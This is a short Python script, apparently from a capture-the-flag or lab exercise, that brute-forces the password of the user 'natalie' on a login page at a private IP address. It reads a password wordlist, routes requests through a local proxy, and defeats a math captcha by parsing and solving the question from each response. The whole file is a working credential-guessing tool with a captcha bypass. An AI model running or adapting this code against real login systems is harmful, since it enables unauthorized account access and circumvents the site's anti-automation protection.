import requests
import re


url = "http://10.10.32.158/login"

proxy = {
    "http":"127.0.0.1:8080"
}

credentials = {
    "username":"admin",
    "password":"admin",
    "captcha":"1"
}

username = open("usernames.txt", "r")
password = open("passwords.txt", "r")

#Function to extract math captcha question
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    if match:
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        return answer
    else:
        return None
    
captcha_answer = 1

# Brute force password
for passwd in password.read().splitlines():
    credentials = {"username": 'natalie', "password": passwd,"captcha": captcha_answer}
    req = requests.post(url, proxies = proxy, data = credentials)
    captcha_answer = extract_captcha(req.text)
    message_passwd = re.search(r'Error(.+)', req.text)
    if message_passwd:
        error_message = message_passwd.group(1)
        print(f"{passwd} - Error message: {error_message}")
    else:
        print(f"Login credential: natalie and {passwd}")
        break    